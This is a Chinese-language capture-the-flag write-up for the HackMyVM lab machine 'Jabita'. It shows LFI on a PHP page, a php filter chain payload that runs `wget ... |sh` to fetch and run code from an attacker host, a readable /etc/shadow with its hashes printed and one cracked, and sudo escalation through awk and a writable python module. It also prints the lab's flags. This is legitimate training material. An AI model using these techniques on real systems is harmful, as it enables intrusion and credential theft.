# Jabita

2025.03.17 https://hackmyvm.eu/machines/machine.php?vm=Jabita

[video]()

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

web 扫描发现 http://192.168.5.40/building/ , 点击顶部导航页面，发现 LFI http://192.168.5.40/building/index.php?page=home.php 可读取/etc/passwd 文件 http://192.168.5.40/building/index.php?page=/etc/passwd

使用 php_filter_chain ，将生成的 php filter 拼接到 page 参数后面直接拿到 shell:

```
python3 ~/tools/py-tools/php_filter_chain_generator.py --chain '<?=`wget -q -O- 3232236803/8|sh`?>'
```

进入系统后，发现/etc/shadow 可读：

```
www-data@jabita:/opt$ cat /etc/shadow
root:$y$j9T$avXO7BCR5/iCNmeaGmMSZ0$gD9m7w9/zzi1iC9XoaomnTHTp0vde7smQL1eYJ1V3u1:19240:0:99999:7:::
jack:$6$xyz$FU1GrBztUeX8krU/94RECrFbyaXNqU8VMUh3YThGCAGhlPqYCQryXBln3q2J2vggsYcTrvuDPTGsPJEpn/7U.0:19236:0:99999:7:::
jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1:19240:0:99999:7:::
```

john 进行破解。找到 jack 用户的密码 joaninha 切换到该用户。

sudo 发现 (jaba : jaba) NOPASSWD: /usr/bin/awk 可提权到 jaba：

```
sudo -u jaba awk 'BEGIN {system("/bin/bash")}'
```

先拿到 user flag：

```
jaba@jabita:~$ cat user.txt
2e0942f09699435811c1be613cbc7a39
```

sudo -l 显示 (root) NOPASSWD: /usr/bin/python3 /usr/bin/clean.py , 查看 py 脚本的内容：

```
jaba@jabita:/usr/bin$ cat /usr/bin/clean.py
import wild

wild.first()
```

查看一下 wild 这个库的内容以及文件权限：

```
jaba@jabita:/usr/bin$ cat /usr/lib/python3.10/wild.py
def first():
	print("Hello")

jaba@jabita:/usr/bin$ ls -al /usr/lib/python3.10/wild.py
-rw-r--rw- 1 root root 29 Sep  5  2022 /usr/lib/python3.10/wild.py
```

发现是一个用户自定义的脚本，并且对其他用户有 w 写权限，直接修改它的内容：

```
echo 'import os; os.system("/bin/bash")' > /usr/lib/python3.10/wild.py
```

再次执行 sudo，拿到最终 flag：

```
jaba@jabita:/usr/bin$ sudo /usr/bin/python3 /usr/bin/clean.py
root@jabita:/usr/bin# cd /root
root@jabita:~# cat root.txt
f4bb4cce1d4ed06fc77ad84ccf70d3fe
```
